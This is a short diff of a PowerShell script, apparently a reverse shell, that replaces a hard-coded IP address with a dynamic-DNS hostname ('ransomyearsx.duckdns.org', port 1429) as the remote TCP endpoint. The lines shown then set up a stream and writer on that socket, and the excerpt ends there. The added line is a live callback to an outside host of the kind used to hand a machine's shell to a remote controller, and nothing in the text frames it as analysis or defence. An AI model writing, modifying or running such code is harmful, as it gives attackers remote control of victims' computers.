@@ -1,4 +1,4 @@
-Set-Variable -Name socket -Value (new-object System.Net.Sockets.TcpClient('91.109.182.9', 1429));
+Set-Variable -Name socket -Value (new-object System.Net.Sockets.TcpClient('ransomyearsx.duckdns.org', 1429));
 if($socket -eq $null){exit 1}
 Set-Variable -Name stream -Value ($socket.GetStream());
 Set-Variable -Name writer -Value (new-object System.IO.StreamWriter($stream));
